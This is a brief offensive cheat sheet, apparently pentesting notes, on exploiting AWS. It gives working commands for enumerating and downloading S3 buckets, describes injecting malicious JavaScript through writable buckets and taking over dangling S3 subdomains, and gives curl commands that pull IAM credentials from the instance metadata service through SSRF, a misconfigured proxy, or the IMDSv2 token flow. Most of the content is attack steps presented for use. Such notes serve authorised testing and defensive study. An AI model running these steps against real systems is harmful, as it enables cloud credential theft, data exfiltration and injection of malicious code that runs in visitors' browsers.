# Exploitation
## S3 bucket pillaging
#### Brute force bucket names
- https://github.com/initstring/cloud_enum
```
python3 cloud_enum.py -k <KEYWORD>
```

#### Use the AWS CLI to list the files of the s3 bucket
```
sudo aws s3 ls s3://<BUCKET> --profile <PROFILE>
```

#### Use the AWS CLI to download the files of the s3 bucket
```
sudo aws s3 sync s3://<BUCKET> s3-files-dir --profile <PROFILE>
```

## S3 code injection
- If a webapp is loading content from an s3 bucket made publicly writeable. Attackers can upload malicious JS to get executed by visitors.

## Domain hijacking
- Hijack S3 domain by finding references in a webapp to S3 buckets that dont exist anymore.
- Or subdomains were linked to S3 buckets with CNAME that still exist.
- When assessing webapps look for 404's to ```*.s3.amazonaws.com```
1. When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error
2. Go create the S3 bucket with the same name and region
3. 3. Load malicious content to the new S3 bucket that will be executed when visitors hit the site

## Instance Metadata Service URL
- For example possible by SSRF or when having access to the file system
```
http://169.254.169.254/latest/meta-data
```

#### Additional IAM creds possibly available here

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
```

- Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured

```bash
curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

#### IMDS Version 2 has some protections 
- but these commands can be used to access it
```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` 
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```
